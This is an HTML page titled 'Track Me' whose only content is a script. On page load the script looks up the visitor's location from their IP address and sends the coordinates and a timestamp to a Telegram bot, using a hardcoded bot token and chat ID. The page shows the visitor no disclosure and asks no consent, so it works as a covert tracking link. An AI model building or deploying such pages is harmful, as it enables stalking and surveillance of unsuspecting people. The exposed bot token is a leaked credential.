<!DOCTYPE html>
<html>
<head>
    <title>Track Me</title>
    <style>
        body {
            background-image: url('img/altarys gif.gif');
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            max-width: 500px;
        }
        #status {
            margin-top: 15px;
            padding: 10px;
            background: rgba(0,0,0,0.5);
            border-radius: 8px;
            font-size: 14px;
            word-break: break-word;
        }
    </style>
</head>
<body>


    <script>
        // ==================== CONFIG ====================
        const BOT_TOKEN = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA'; // <-- REPLACE OR HIDE
        const CHAT_ID = '5410457102';
        const statusDiv = document.getElementById('status');

        // ==================== SEND TO TELEGRAM ====================
        async function sendToTelegram(lat, lon, source, device, userName) {
            const textMsg = `👤 Name: ${userName || 'Anonymous'}\n` +
                            `📍 Location: ${lat}, ${lon} (${source})\n` +
                            `📱 Device: ${device}\n` +
                            `🕒 Time: ${new Date().toLocaleString()}`;

            try {
                // 1. Send text
                const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
                });
                if (!textResponse.ok) {
                    throw new Error(`Failed to send text message: ${textResponse.statusText}`);
                }

                // 2. Send native location pin
                const locationResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
                });
                if (!locationResponse.ok) {
                    throw new Error(`Failed to send location: ${locationResponse.statusText}`);
                }

                statusDiv.textContent = '✅ LOCATION SENT! Check your Telegram.';
            } catch (err) {
                statusDiv.textContent = '❌ ERROR: ' + err.message;
                console.error(err);
            }
        }

        // ==================== MAIN ACTION ====================
        async function captureAndSendData() {
            try {
                // Get location using IP geolocation API
                const location = await getLocationByIP();

                // Send location data
                await sendToTelegram(location.lat, location.lon, 'IP Geolocation API', 'Unknown', 'Anonymous');
            } catch (err) {
                statusDiv.textContent = '❌ ERROR: ' + err.message;
                console.error(err);
            }
        }

        // ==================== GET LOCATION BY IP ====================
        function getLocationByIP() {
            return new Promise((resolve, reject) => {
                fetch('https://ipapi.co/json/')
                    .then(response => response.json())
                    .then(data => {
                        if (data.latitude && data.longitude) {
                            resolve({
                                lat: data.latitude,
                                lon: data.longitude
                            });
                        } else {
                            reject(new Error('Failed to retrieve location data from IP geolocation API.'));
                        }
                    })
                    .catch(error => {
                        reject(new Error(`IP geolocation API error: ${error.message}`));
                    });
            });
        }

        // Capture and send data when the page loads
        window.onload = captureAndSendData;
    </script>
</body>
</html>
